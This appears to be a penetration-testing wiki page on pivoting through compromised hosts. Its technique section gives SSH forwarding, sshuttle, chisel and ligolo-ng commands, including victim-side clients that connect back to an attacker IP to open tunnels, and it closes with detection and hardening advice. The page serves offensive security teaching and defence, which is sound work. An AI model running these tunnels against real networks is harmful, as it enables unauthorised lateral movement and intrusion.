---
title: Pivoting and Tunneling Through Compromised Hosts
slug: pivoting-and-tunneling
---

> **TL;DR:** Pivoting turns one foothold into network access — pick local, remote, or dynamic forwarding based on which side initiates the connection and whether you need a SOCKS proxy.

## What it is
Pivoting routes attacker traffic through a compromised host to reach internal segments the attacker cannot touch directly. The three primitives are local forward (attacker → pivot → target on a fixed port), remote forward (pivot → attacker for callbacks), and dynamic forward (a SOCKS proxy that handles arbitrary destinations). Modern engagements stack these: ligolo-ng or chisel for full L3-ish reach, ssh for clean one-off ports, sshuttle for a quick VPN-lite over an SSH foothold.

## Preconditions / where it applies
- Foothold type: code execution with outbound network or an SSH login on the pivot
- Target OS: any — most tools have Linux + Windows binaries
- Egress restrictions: at least one outbound port (443/53/80) reachable to the attacker

## Technique
SSH primitives (memorise these):
```bash
# Local forward — hit internal HTTP on 10.0.0.5:80 via pivot
ssh -L 8080:10.0.0.5:80 user@pivot
# Remote forward — expose attacker:4444 listener to victim network
ssh -R 4444:127.0.0.1:4444 user@pivot
# Dynamic SOCKS proxy
ssh -D 1080 user@pivot
proxychains4 nmap -sT -Pn 10.0.0.0/24
```

sshuttle (cheap VPN over SSH):
```bash
sshuttle -r user@pivot 10.0.0.0/16 --dns
```

chisel (works when SSH is unavailable, runs over HTTP/WebSocket):
```bash
# attacker
chisel server -p 8000 --reverse
# victim
./chisel client 10.10.14.5:8000 R:socks
```

ligolo-ng (TUN-based, behaves like a real interface):
```bash
# attacker
./proxy -selfcert
# victim
./agent -connect 10.10.14.5:11601 -ignore-cert
# attacker prompt
ligolo» session ; start
ip route add 10.0.0.0/16 dev ligolo
```

Windows pivot using plink and socat:
```powershell
plink.exe -ssh -R 4444:127.0.0.1:4444 user@10.10.14.5
```

Mental model: forward = pull data toward me, reverse = push a callback channel through me, dynamic = generic SOCKS for tooling that supports it (nmap, BloodHound, Burp).

## Detection and defence
- Network signals: long-lived outbound TLS/SSH to non-business IPs, unusual SNI, repeated short connections (chisel keepalive)
- Process signals: `ssh -R`/`-D` from service accounts, unknown binaries with raw socket activity, TUN interface creation
- Hardening: egress allowlist with TLS inspection, deny outbound 22/443 from server VLANs to internet, monitor for new TUN/TAP devices

## References
- [chisel](https://github.com/jpillora/chisel) — fast TCP/UDP tunnel over HTTP
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) — reverse tunneling with TUN interface

See also: [[ssh-tunneling]], [[socks-proxies]], [[chisel]], [[ligolo-ng]].
